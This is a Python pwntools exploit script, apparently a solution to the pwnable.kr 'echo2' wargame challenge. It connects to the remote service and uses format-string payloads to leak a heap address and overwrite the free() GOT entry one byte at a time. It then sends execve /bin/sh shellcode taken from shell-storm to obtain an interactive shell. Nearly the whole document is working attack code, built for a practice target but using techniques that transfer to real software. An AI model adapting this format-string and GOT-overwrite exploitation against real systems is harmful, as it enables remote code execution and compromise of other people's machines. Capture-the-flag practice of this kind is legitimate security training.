# -*- coding: utf-8 -*-
from pwn import *

remoto = False
remoto = True
if remoto:
	host = '0'
	host = 'pwnable.kr'
	conn = connect(host, 9011)
else:
	conn = process('./echo2')

nombre = 'physics'
shellcode = 'A' + 'B' * 29 + 'C'
# http://shell-storm.org/shellcode/files/shellcode-806.php
shellcode = "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"
free_GOT = 0x602000
obj_o = 0x602098

assert len(shellcode) < 32

def read_addr(address, text=False):
	conn.sendline('2')
	conn.recvuntil('\n')
	payload  = '%7$s    '
	payload += p64(address)
	conn.sendline( payload )
	addr = conn.recvuntil('    ')[:-4]
	if text is False:
		addr += '\x00' * (8 - len(addr))
		addr  = u64(addr)
	conn.recvuntil('> ')
	return addr

def main():
	print ''
	conn.recvuntil('name? : ')
	conn.sendline(nombre)
	conn.recvuntil('> ')

	# get shellcode address
	leak = read_addr(obj_o)
	print 'heap leak:' + hex(leak)
	shellcode_addr = leak + 48
	print 'shellcode addr:' + hex(shellcode_addr)
	if len(hex(shellcode_addr)) > 8:
		print 'Try again'
		conn.close()
		return

	# wipe free got adddr
	conn.sendline('2')
	conn.recvuntil('\n')
	payload  = '%7$lln  '
	payload += p64(free_GOT)
	conn.sendline( payload )
	conn.recvuntil('> ')
	print 'free GOT address wiped'
	print ''

	# overwrite free got adddr
	sh_bytes = hex(shellcode_addr)[2:]
	b1 = (2, int(sh_bytes[0:2],   16))
	b2 = (1, int(sh_bytes[2:4],   16))
	b3 = (0, int(sh_bytes[4:6],   16))
	sh_bytes = [b1, b2, b3]

	print 'writing shellcode address in free GOT...'
	print ''
	for sh_byte in sh_bytes:
		pos, lenght = sh_byte
		if lenght < 8:
			print 'try again'
			conn.close()
			return
		else:
			conn.sendline('2')
			conn.recvuntil(nombre)
			print 'write:' + hex(lenght)
			extra = len(str(lenght))
			payload  = '%{:d}x'.format(lenght - (8 - extra))
			payload += ' ' * (8 - extra)
			payload += '%8$hhn'
			payload += p64(free_GOT +  pos)
			conn.sendline( payload )
			conn.recvuntil('> ')

	print 'new free addr:' + hex(read_addr(free_GOT))
	#print 'shellcode:' + read_addr(shellcode_addr, text=True)
	print 'executing shellcode and getting shell...'
	print ''

	# write shellcode and execute its execution
	conn.sendline('3')
	conn.sendline(shellcode)
	conn.interactive()
	conn.close()

if __name__ == '__main__':
	try:
		main()
	except KeyboardInterrupt as e:
		pass
